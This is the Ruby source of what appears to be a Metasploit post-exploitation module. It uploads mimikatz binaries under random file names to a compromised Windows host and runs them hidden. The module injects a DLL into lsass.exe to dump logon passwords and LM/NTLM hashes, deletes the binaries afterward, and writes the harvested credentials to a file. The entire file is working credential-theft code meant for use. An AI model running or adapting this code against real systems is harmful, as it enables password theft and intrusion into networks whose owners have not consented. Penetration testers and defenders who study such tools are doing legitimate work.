require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

        def initialize(info={})
                super( update_info( info,
                        'Name'          => 'Mimikatz',
                        'Description'   => %q{
				This module will upload the mimikatz executables to the target and retrieve passwords stored in lsass.exe.
                        },
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Matt Andreko "hostess"' ],
                        'Version'       => '$Revision$',
                        'Platform'      => [ 'windows' ],
                        'SessionTypes'  => [ 'meterpreter' ],
                        'References'    => [
                                [ 'URL', 'http://blog.gentilkiwi.com/mimikatz' ]
                        ],
                        'DisclosureDate'=> "Dec 31, 2010"
                ))

                register_options([
			OptBool.new('SHOW_SYSTEM_USERS', [ false, 'Show the system users, which often have un-readable passwords.', false])
                ])

        end

	def run
		print_status("Running module against #{sysinfo['Computer']}")
		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
                pass_file = store_loot("windows.passwords", "text/plain", session, "", "#{host}_passwords.txt", "Windows Passwords")
		print_status("Writing output to: #{pass_file}")
                mimikatz_dump(pass_file)
	end

	def mimikatz_dump(password_file)

		#
		# Upload mimikatz.exe and sekurlsa.dll
		#

		# randomize the filenames
                exe_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
		dll_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".dll"
		tmpdir = session.fs.file.expand_path("%TEMP%")

		# path to the mimikatz binaries
                path = ::File.join(Msf::Config.install_root, "data", "post")

		# decide, x86 or x64
                mexe = nil
		mdll = nil
                if sysinfo["Architecture"] =~ /wow64/i
                        mexe = ::File.join(path, "mimikatz-x64.exe")
			mdll = ::File.join(path, "sekurlsa-x64.dll")
                else
                        mexe = ::File.join(path, "mimikatz-x86.exe")
			mdll = ::File.join(path, "sekurlsa-x86.dll")
                end

		begin
			session.fs.file.upload_file("#{tmpdir}\\#{exe_filename}", mexe)
			session.fs.file.upload_file("#{tmpdir}\\#{dll_filename}", mdll)

			print_status("Mimikatz executables being uploaded..")
		rescue ::Exception => e
                        print_error("Error uploading files: #{e.class} #{e}")
                        return
                end

		#
		# Execute mimikatz
		#

		print_status("Executing #{tmpdir}\\#{exe_filename}")
		r = session.sys.process.execute("cmd /c \"#{tmpdir}\\#{exe_filename}\"", nil, {'Hidden' => true, 'Channelized' => true})

		r.channel.read
		r.channel.write("privilege::debug\n")
		
		r.channel.read
		r.channel.write("inject::process lsass.exe \"#{tmpdir}\\#{dll_filename}\"\n")
		
		r.channel.read
                r.channel.write("@getLogonPasswords\n")
                
		user_output = r.channel.read
                user_output += r.channel.read

		r.channel.write("exit\n")
			
		# clean up files 
		print_status("Deleting executables")	
                delete_exe = "cmd.exe /c del \"#{tmpdir}\\#{exe_filename}\""
		delete_dll = "cmd.exe /c del \"#{tmpdir}\\#{dll_filename}\""	
                session.sys.process.execute(delete_exe, nil, {'Hidden' => true})
		session.sys.process.execute(delete_dll, nil, {'Hidden' => true})

		users = parse_passdump(user_output)
                output_file(users, password_file)
	end

	def parse_passdump(pass_dump)

		users = []

		current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}

		pass_dump.split(/\r?\n/).each do |line|

			if line.match(/^Utilisateur principal/)
				current[:username] = line[/.*:\s(.*)/, 1] || ""
			elsif line.match(/^Domaine d'authentification/)
				current[:domain] = line[/.*:\s(.*)/, 1] || ""
			elsif line.match(/msv1_0/)
				current[:lmhash] = line[/.*:\s*lm\{\s([0-9a-f]*)\s\}.*/, 1] || ""
				current[:ntlmhash] = line[/.*ntlm\{\s([0-9a-f]*)\s\}.*/, 1] || ""
			elsif line.match(/wdigest/)
				current[:wdigest] = line[/.*:\s*(.*)/, 1] || ""
				current[:wdigest] = "" if current[:wdigest] == "n.t. (LUID KO)"	
			elsif line.match(/tspkg/)
				current[:tspkg] = line[/.*:\s*(.*)/, 1] || ""
				current[:tspkg] = "" if current[:tspkg] == "n.t. (LUID KO)"

				#Check to see if we are storing all users, or only non-system users
				if datastore['SHOW_SYSTEM_USERS'] || !is_system_user?(current)
					users.push(current)
				end
				current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
			end
		end

		return users
	end

	def output_file(users, password_file)

		output = "username, domain, lmhash, ntlmhash, wdigest, tspkg\n"
		output += users.collect {|u| "\"#{u[:username]}\", \"#{u[:domain]}\", \"#{u[:lmhash]}\", \"#{u[:ntlmhash]}\", \"#{u[:wdigest]}\", \"#{u[:tspkg]}\"\n" }.join

		file_local_write(password_file, output)	

		output.split(/\r?\n/).each do |line|
			print_good(line)
		end

	end

	def is_system_user?(user)
		system_users = [/^$/, /^ASPNET$/, /^ASP\.NET V2\.0 Integrated$/, /^ANONYMOUS LOGON$/, /^IUSR.*/, /^IWAM.*/, /^IIS_WPG$/, /.*\$$/, /^LOCAL SERVICE$/, /^NETWORK SERVICE$/, /^LOCAL SYSTEM$/]	
		return system_users.find{|r| user[:username].match(r)}
	end

end
